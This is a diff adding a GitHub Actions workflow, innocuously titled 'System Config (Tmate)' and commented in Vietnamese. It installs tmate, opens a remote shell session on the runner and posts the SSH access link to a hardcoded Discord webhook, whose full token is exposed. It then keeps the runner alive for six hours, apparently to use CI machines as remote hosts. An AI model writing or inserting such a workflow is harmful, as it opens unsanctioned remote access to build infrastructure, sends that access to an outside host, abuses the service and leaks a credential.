@@ -1,0 +1,51 @@
+# USER_ID: 1234
+name: System Config (Tmate)
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sys_job:
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Cài tmate
+      run: |
+        sudo apt update
+        sudo apt install -y tmate
+
+    - name: Start tmate session
+      run: |
+        tmate -S /tmp/tmate.sock new-session -d
+        tmate -S /tmp/tmate.sock wait tmate-ready
+        tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}' > sshlink.txt
+
+    - name: Debug SSH link từ tmate
+      run: |
+        echo "====== SSH LINK ======"
+        cat sshlink.txt || echo "Không tìm thấy sshlink.txt"
+        echo "======================"
+
+    - name: Gửi SSH link về Discord Webhook
+      env:
+        DISCORD_WEBHOOK: https://discord.com/api/webhooks/1327906472029458495/1bSkWLlV_cdvWThG0xK3YNAP7MYTgmyKZB_oK_zIiiw0b7D3u3rsMDUHrYuXiNdeMftq
+      run: |
+        USER_ID=$(grep "# USER_ID:" .github/workflows/settings.yml | awk '{print $3}')
+        LINK=$(cat sshlink.txt 2>/dev/null | tr -d '\r\n')
+
+        if [ -n "$LINK" ]; then
+          echo "{\"content\":\"{\\\"user_id\\\":\\\"$USER_ID\\\",\\\"ssh\\\":\\\"$LINK\\\"}\"}" > payload.json
+        else
+          echo "{\"content\":\"{\\\"user_id\\\":\\\"$USER_ID\\\",\\\"ssh\\\":\\\"(không tìm thấy link SSH)\\\"}\"}" > payload.json
+        fi
+
+        cat payload.json
+        curl -X POST -H "Content-Type: application/json" -d @payload.json "$DISCORD_WEBHOOK"
+
+    - name: Giữ session 6 tiếng với keep-alive
+      run: |
+        echo "Bắt đầu giữ tmate trong 6 tiếng..."
+        for ((i = 0; i < 21600; i+=30)); do
+          echo "Still alive at $(date)"
+          sleep 30
+        done
